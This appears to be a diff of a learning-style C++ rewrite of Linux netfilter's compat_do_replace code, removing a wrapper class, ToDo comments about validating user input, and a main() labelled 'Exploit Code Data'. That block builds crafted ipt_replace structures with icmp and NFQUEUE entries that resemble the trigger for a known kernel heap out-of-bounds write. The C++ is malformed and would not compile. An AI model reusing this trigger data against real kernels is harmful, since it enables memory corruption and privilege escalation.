@@ -682,72 +682,6 @@ compat_ipt_get_target(struct compat_ipt_entry *e)
 
 
 
-////////// C++ Abstraction ////////////////////////
-class XtTableInfo
-{
-    private:
-        /* Size per table */
-        unsigned int size;
-        /* Number of entries: FIXME. --RR */
-        unsigned int number;
-         /* Initial number of entries. Needed for module usage count */
-        unsigned int initial_entries;
-         /* Entry points and underflows */
-        unsigned int hook_entry[NF_INET_NUMHOOKS];
-        unsigned int underflow[NF_INET_NUMHOOKS];
-         /*
-             * Number of user chains. Since tables cannot have loops, at most
-             * @stacksize jumps (number of user chains) can possibly be made.
-        */
-         unsigned int stacksize;
-         void ***jumpstack;
- 
-         unsigned char entries[0]; //__aligned(8);
-	
-	XtTableInfo *xt_alloc_table_info(unsigned int size);
-
-      void xt_free_table_info(XtTableInfo *info);
-
-	bool valideUserInput(__user void *user);
-      
-      public:
-         XtTableInfo();//default constructor
-
-/* Getters */
-         unsigned int getSize(){
-            return size;
-         }
-
-         unsigned int getNumber(){
-            return number;
-         }
-
-         unsigned int getInitialEntries(){
-            return initial_entries;
-         }
-
-         unsigned int getStackSize(){
-            return stacksize;
-         }
-
-        void * getEntries(){
-            return entries;
-        }
-
-	  unsigned int * getHookEntry(){
-            return hook_entry;
-        }
-
-	 unsigned int * getUnderflow(){
-            return underflow;
-       }
-/* End Getters */
-
-    //function copies user data from user-space to kernel-space
-    //ToDo: how do I validate the user input since it is a void pointer?
-    compat_do_replace(void __user *user);
-      
-};
 ////////// End C++ Abstraction ////////////////////////
 
 /**
@@ -805,23 +739,7 @@ void XtTableInfo::xt_free_table_info(XtTableInfo *info)
 	free(info);
 }
 
-/**
- * @brief Construct a new XtTableInfo::compat_do_replace object
- * 
- * @param user -- Holds the data from the user, since it is a void pointer, the user could send any type of data.
- */
-XtTableInfo::compat_do_replace(void __user *user){
-	struct net *net;
 
-	int ret;
-	struct compat_ipt_replace tmp;
-	//ToDo: Where I am stock now is how to successfully validate this user input first [valideUserInput()]
-	if(valideUserInput(user)){
-		return compat_do_replace(net, user, 0);
-	}
-
-	return -1;
-}
 
 /**
  *@brief  
@@ -899,38 +817,3 @@ int compat_do_replace(struct net *net, void __user *user, unsigned int len)
 
 
 
-int main ()
-{
-	///////////////////////// Exploit Code Data /////////////////////////////////
-	struct __attribute__((__packed__)) {
-	struct ipt_replace replace;
-	struct ipt_entry entry;
-	struct xt_entry_match match;
-	char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];
-	struct xt_entry_target target;
-	} data = {0};
-
-	data.replace.num_counters = 1;
-	data.replace.num_entries = 1;
-	data.replace.size = (sizeof(data.entry) + sizeof(data.match) +
-				sizeof(data.pad) + sizeof(data.target));
-
-	data.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) +
-					sizeof(data.pad) + sizeof(data.target));
-	data.entry.target_offset =
-		(sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad));
-
-	data.match.u.user.match_size = (sizeof(data.match) + sizeof(data.pad));
-	strcpy(data.match.u.user.name, "icmp");
-	data.match.u.user.revision = 0;
-
-	data.target.u.user.target_size = sizeof(data.target);
-	strcpy(data.target.u.user.name, "NFQUEUE");
-	data.target.u.user.revision = 1;
-	////////////////////////// END Exploit Code Data ///////////////////////////////
-
-	//API call illustration
-	new XtTableInfo::compat_do_replace(&data);	
-      
-      return 0;
-}
